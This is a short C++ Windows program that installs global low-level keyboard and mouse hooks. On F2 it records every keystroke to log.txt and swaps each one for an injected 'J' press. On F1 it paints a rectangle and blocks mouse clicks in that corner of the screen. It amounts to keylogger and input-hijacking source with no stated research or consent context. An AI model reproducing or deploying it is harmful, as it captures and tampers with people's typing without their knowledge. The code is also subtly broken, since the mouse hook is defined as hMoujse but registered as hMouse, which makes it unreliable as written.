#include <Windows.h>
#include <iostream>
#include <fstream>

using namespace std;

bool stopApl = false;
bool rectMode = false;
bool changeKey = false;

bool keyflag = true;

void paintRect()
{
	while (rectMode)
	{
		HDC hDC = GetDC(0);
		Rectangle(hDC, 0, 0, 200, 200);
	}
	return;
}
LRESULT CALLBACK hKey(int code, WPARAM wParam, LPARAM lParam)
{
	switch (wParam)
	{
		case WM_KEYDOWN:
		{
			KBDLLHOOKSTRUCT* st = (KBDLLHOOKSTRUCT*)lParam;
			if (st->vkCode == VK_F2)
			{
				if (changeKey)
					changeKey = false;
				else changeKey = true;
			}
			if (st->vkCode == VK_F1)
			{
				if (!rectMode)
				{
					rectMode = true;
					CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)paintRect, NULL, NULL, NULL);
				}
				else rectMode = false;
			}
			if (st->vkCode == 27)
			{
				stopApl = true;
				return CallNextHookEx(NULL, code, wParam, lParam);
			}
			if (keyflag)
			{
				keyflag = false;
				return CallNextHookEx(NULL, code, wParam, lParam);
			}
			if (changeKey)
			{
				ofstream file;
				file.open("log.txt", ios::app);	
				file << (char)st->vkCode << " ";
				file.close();
				st->scanCode = 5;
				st->vkCode = 55;
				keyflag = true;
				keybd_event(0x4A, 0, 0, 0);
				return 1;
			}
			break;
		}
	default:
		return CallNextHookEx(NULL, code, wParam, lParam);
		break;
	}
	
	return CallNextHookEx(NULL, code, wParam, lParam);
}
LRESULT CALLBACK hMoujse(int code, WPARAM wParam, LPARAM lParam)
{
	MOUSEHOOKSTRUCT* st = (MOUSEHOOKSTRUCT*)lParam;
	if (rectMode)
	{
		if (st->pt.x < 200 && st->pt.y < 200) return 1;
	}

	return CallNextHookEx(NULL, code, wParam, lParam);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpszCmdParam, int nCmdShow)
{
	MSG message;
	SetWindowsHookEx(WH_KEYBOARD_LL, hKey, NULL, NULL);
	SetWindowsHookEx(WH_MOUSE_LL, hMouse, NULL, NULL);
	while (!stopApl)
	{
		PeekMessage(&message, NULL, 0, 0, PM_NOREMOVE);
	}
}